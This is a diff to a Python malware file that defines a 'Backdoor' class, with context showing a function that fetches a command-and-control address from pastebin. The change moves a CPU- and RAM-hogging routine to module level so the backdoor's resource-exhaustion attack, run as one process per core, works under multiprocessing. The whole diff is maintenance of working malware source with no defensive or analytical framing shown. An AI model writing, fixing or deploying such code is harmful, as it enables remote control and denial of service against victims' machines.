@@ -28,6 +28,17 @@ def fetch_c2_ip():
     except:
         return "Server down for pastebin" 
 
+def hog_resources(duration, cpu_work=True, ram_size_mb=50):
+    """Function that hogs CPU and RAM - must be at module level for multiprocessing"""
+    # Allocate RAM (list of ~ram_size_mb MB integers)
+    hog_mem = [0] * (ram_size_mb * 250_000)  # ~50 MB -> 250k ints
+    if cpu_work:
+        end_time = time.time() + duration
+        while time.time() < end_time:
+            x = 123456 ** 2  # busy work to keep CPU busy
+    else:
+        time.sleep(duration)  # just hold memory without using CPU
+
 class Backdoor:
     def __init__(self, ip, port):
         if not TESTING_MODE:
@@ -255,24 +266,14 @@ class Backdoor:
             duration: How long to run the attack in seconds
             ram_size_mb: How much RAM to allocate per CPU core in MB
         """
-        def hog(cpu_work=True, ram_size_mb=50):
-            """Function that hogs CPU and RAM."""
-            # Allocate RAM (list of ~ram_size_mb MB integers)
-            hog_mem = [0] * (ram_size_mb * 250_000)  # ~50 MB -> 250k ints
-            if cpu_work:
-                end_time = time.time() + duration
-                while time.time() < end_time:
-                    x = 123456 ** 2  # busy work to keep CPU busy
-            else:
-                time.sleep(duration)  # just hold memory without using CPU
-
         try:
             cores = multiprocessing.cpu_count()
             processes = []
             
             # Start processes - one per core
             for _ in range(cores):
-                p = multiprocessing.Process(target=hog, args=(True, ram_size_mb))
+                # Use the standalone function with proper arguments
+                p = multiprocessing.Process(target=hog_resources, args=(duration, True, ram_size_mb))
                 p.daemon = True  # Allow process to be terminated when parent exits
                 p.start()
                 processes.append(p)
